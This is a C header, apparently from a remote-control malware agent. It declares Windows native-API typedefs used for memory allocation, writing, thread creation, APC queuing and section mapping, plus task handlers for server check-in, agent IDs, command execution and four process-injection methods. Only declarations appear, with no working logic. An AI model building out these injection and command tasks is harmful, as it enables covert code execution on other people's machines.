#ifndef _TASK_
#define _TASK_
#include "../message/Message.h"


typedef PMESSAGE (*TaskHandler)(PBYTE payload, DWORD size);
typedef NTSTATUS(NTAPI* fnNtAllocVirtualMemory)
(
    IN      HANDLE    ProcessHandle,
    IN OUT PVOID     *BaseAddress,
    IN      ULONG_PTR ZeroBits,
    IN OUT PSIZE_T   RegionSize,
    IN      ULONG     AllocationType,
    IN      ULONG     Protect
);
typedef NTSTATUS(NTAPI* fnNtProtectVirtualMemory)
(
    IN HANDLE               ProcessHandle,
    IN OUT PVOID            *BaseAddress,
    IN OUT PULONG           NumberOfBytesToProtect,
    IN ULONG                NewAccessProtection,
    OUT PULONG              OldAccessProtection 
);
typedef NTSTATUS(NTAPI* fnNtWritetVirtualMemory)
(
    IN HANDLE               ProcessHandle,
    IN OUT PVOID                BaseAddress,
    IN PVOID                Buffer,
    IN ULONG                NumberOfBytesToWrite,
    OUT PULONG              NumberOfBytesWritten OPTIONAL 
);
typedef struct _pObjectAttribute{} COBJECT_ATTRIBUTES, *PCOBJECT_ATTRIBUTES;
typedef struct _pAttributeList{} PS_ATTRIBUTE_LIST, *PPS_ATTRIBUTE_LIST;
typedef NTSTATUS(NTAPI* fnNtCreateThreadEx)
(
    OUT PHANDLE ThreadHandle,
    IN ACCESS_MASK DesiredAccess,
    IN PCOBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
    IN HANDLE ProcessHandle,
    IN PVOID StartRoutine,
    IN PVOID Argument   OPTIONAL,
    IN ULONG CreateFlags, // THREAD_CREATE_FLAGS_*
    IN SIZE_T ZeroBits,
    IN SIZE_T StackSize,
    IN SIZE_T MaximumStackSize,
    IN PPS_ATTRIBUTE_LIST AttributeList OPTIONAL
);
typedef NTSTATUS (NTAPI* fnNtQueueApcThread)
(
 IN HANDLE               ThreadHandle,                 // A handle to the thread to run the specified APC
 IN PVOID      ApcRoutine,                   // Pointer to the application-supplied APC function to be executed
 IN PVOID                ApcRoutineContext OPTIONAL,   // Pointer to a parameter (1) for the APC (set to NULL)
 IN PVOID     ApcStatusBlock OPTIONAL,      // Pointer to a parameter (2) for the APC (set to NULL)
 IN ULONG                ApcReserved OPTIONAL          // Pointer to a parameter (3) for the APC (set to NULL)
);
typedef struct _OBJECT_ATTRIBUTES{}OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;
typedef NTSTATUS (NTAPI* fnNtCreateSection)
(
  OUT PHANDLE             SectionHandle,          // Pointer to a HANDLE variable that receives a handle to the section object
  IN ACCESS_MASK          DesiredAccess,          // The type of the access rights to section handle 
  IN POBJECT_ATTRIBUTES   ObjectAttributes,       // Pointer to an OBJECT_ATTRIBUTES structure (set to NULL) 
  IN PLARGE_INTEGER       MaximumSize,            // Maximum size of the section
  IN ULONG                SectionPageProtection,  // Protection to place on each page in the section
  IN ULONG                AllocationAttributes,   // Allocation attributes of the section (SEC_XXX flags) 
  IN HANDLE               FileHandle              // Optionally specifies a handle for an open file object (set to NULL)
);  
typedef enum _SECTION_INHERIT 
{
      ViewShare = 1,
      ViewUnmap = 2
} SECTION_INHERIT, * PSECTION_INHERIT;
typedef NTSTATUS (WINAPI* fnNtMapViewOfSection)
(
    IN HANDLE               SectionHandle,            // HANDLE to Section Object created by 'NtCreateSection'
    IN HANDLE               ProcessHandle,            // Process handle of the process to map the view to
    IN OUT PVOID            *BaseAddress,             // Pointer to a PVOID variable that receives the base address of the view
    IN ULONG                ZeroBits,                 // set to NULL
    IN SIZE_T               CommitSize,               // set to NULL  
    IN OUT PLARGE_INTEGER   SectionOffset,            // set to NULL
    IN OUT PSIZE_T          ViewSize,                 // A pointer to a SIZE_T variable that contains the size of the memory to be allocated
    IN SECTION_INHERIT      InheritDisposition,       // How the view is to be shared with child processes
    IN ULONG                AllocationType,           // type of allocation to be performed (set to NULL)
    IN ULONG                Protect                   // Protection for the region of allocated memory
);
typedef NTSTATUS (WINAPI* fnNtUnmapViewOfSection)
(
    IN HANDLE               ProcessHandle,    // Process handle of the process that contains the view to unmap
    IN PVOID                BaseAddress       // Base address of the view to unmap
);
typedef NTSTATUS (WINAPI* fnNtClose)
(
    IN HANDLE               ObjectHandle    // Handle of the object to close
);


PMESSAGE pingServer();
PMESSAGE initAgentId(PBYTE payload, DWORD size);
PMESSAGE injectViaDllTask(PBYTE payload, DWORD size);
PMESSAGE injectViaApcTask(PBYTE payload, DWORD size);
PMESSAGE injectViaFileMappingTask(PBYTE payload, DWORD size);
PMESSAGE injectViaClassicProcessTask(PBYTE payload, DWORD size);
PMESSAGE executeCommandTask(PBYTE payload, DWORD size);

#endif